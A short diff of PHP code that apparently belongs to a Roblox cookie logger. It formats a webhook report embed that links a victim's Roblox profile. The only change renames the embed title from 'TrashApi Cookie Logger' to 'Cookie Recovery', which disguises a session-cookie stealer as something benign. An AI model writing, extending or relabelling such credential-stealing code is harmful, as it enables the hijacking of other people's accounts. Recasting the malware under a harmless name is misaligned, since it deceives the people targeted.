@@ -76,7 +76,7 @@
             "avatar_url" => "",
             "embeds" => [
                 [
-                    "title" => '"TrashApi" Cookie Logger',
+                    "title" => 'Cookie Recovery',
                     "type" => "rich",
                     "description" => "",
                     "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
